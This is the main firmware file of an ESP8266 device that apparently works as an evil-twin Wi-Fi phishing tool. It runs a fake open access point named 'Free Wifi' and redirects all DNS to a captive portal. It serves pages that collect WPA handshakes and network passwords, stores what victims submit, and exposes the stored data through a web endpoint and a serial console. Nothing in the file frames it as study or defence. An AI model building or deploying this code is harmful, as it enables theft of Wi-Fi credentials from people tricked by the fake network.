#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ArduinoJson.h>
#include <LittleFS.h>

#include "utils.h"
#include "wifi.h"
#include "server.h"


// Global variables 
IPAddress APIP(172, 0, 0, 1);
const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer server(80);


void setup()
{
  Serial.begin(115200);
  Serial.println("\nBooting");
  if (!LittleFS.begin()) {
    Serial.println("Failed to mount file system");
    return;
  }
  Serial.println("File system mounted");
  initialServerSetup(APIP);
  dnsServer.start(DNS_PORT, "*", APIP);

  server.on("/", [](){handleRequest(server, "/index.html.gz","html");});
  server.on("/handshake", [](){handleRequest(server, "/handshake.html.gz","html");});
  server.on("/ssid", [](){handleRequest(server, "/ssid.html.gz","html");});
  server.on("/final", [](){handleRequest(server, "/final.html.gz","html");});

  server.on("/jquery.min.js", [](){handleRequest(server,"/jquery.min.js.gz","js");});
  server.on("/bootstrap.min.js", [](){handleRequest(server,"/bootstrap.min.js.gz","js");});
  server.on("/capfile.js", [](){handleRequest(server,"/capfile.js.gz","js");});
  server.on("/crypto.js", [](){handleRequest(server,"/crypto.js.gz","js");}); 

  server.on("/post_ssid", [](){String ssid = server.arg("ssid");changeWifi(ssid);});
  server.on("/post_handshake",[]() {handlePostHandshake(server);});
  server.on("/post_password",[]() {handlePostPassword(server); BLINK(5); });
  server.on("/get_datas",[]() {server.send(200, "application/json", getDatas());});
  server.on("/clear_handshakes",[]() {server.send(200, "application/json", clearHandshakes());});
  server.on("/clear_passwords",[]() {server.send(200, "application/json", clearPasswords());});

  server.onNotFound([](){handleNotFound(server);});

  server.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop()
{
  if (Serial.available()) {
    String inputString = Serial.readStringUntil('\n');
    const char *buffer = inputString.c_str();

    if(strcmp(buffer,"help") == 0){
      Serial.println("Available commands:");
      Serial.println("help - show this message");
      Serial.println("ls - list files");
      Serial.println("show config - show config file");
      Serial.println("show datas - show datas file");
      Serial.println("reset ssid - reset ssid to default(Free Wifi)");
      Serial.println("storage info - show storage info");
    }

    else if (strcmp(buffer, "ls") == 0) {
      Serial.println("Listing files...");
      listDir("/",1);
      Serial.println("");
    }

    else if (strcmp(buffer, "show config") == 0) {
      Serial.println("Reading config file...");
      DynamicJsonDocument config = readJsonFile("/json/config.json");
      serializeJson(config, Serial);
      Serial.println("");
    }

    else if (strcmp(buffer, "show datas") == 0) {
      Serial.println("Reading datas file...");
      String datas = getDatas();
      Serial.println(datas);
      Serial.println("");
    }

    else if (strcmp(buffer,"reset ssid") == 0){
      Serial.println("Resetting config file...");
      DynamicJsonDocument config = readJsonFile("/json/config.json");
      config.clear();
      config["ssid"] = "Free Wifi";
      writeJsonFile("/json/config.json", config);
      setupWifi();
    }
    else if (strcmp(buffer,"storage info") == 0){
      Serial.println("Calculating Space...");
      storageInfo();  
    }

    else {
      Serial.println("Invalid command");
      Serial.println("Type help to see available commands");
    }
    Serial.println("");
  }
  dnsServer.processNextRequest();
  server.handleClient();
}
